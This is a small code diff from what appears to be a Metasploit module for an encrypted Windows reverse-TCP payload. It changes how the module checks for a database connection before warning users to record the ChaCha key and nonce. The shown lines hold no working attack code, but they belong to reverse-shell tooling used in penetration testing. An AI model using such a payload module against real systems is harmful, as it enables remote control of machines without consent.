@@ -23,7 +23,7 @@ module Payload::Windows::EncryptedReverseTcp
 
     # prevents checks running when module is initialized during msfconsole startup
     if framework
-      unless framework.db.connection_established?
+      unless framework.db.active
         add_warning('A database connection is preferred for this module. If this is not possible, please make sure to '\
         'take note of the ChachaKey & ChachaNonce options used during generation in order to set them correctly when '\
         'calling a module handler.')
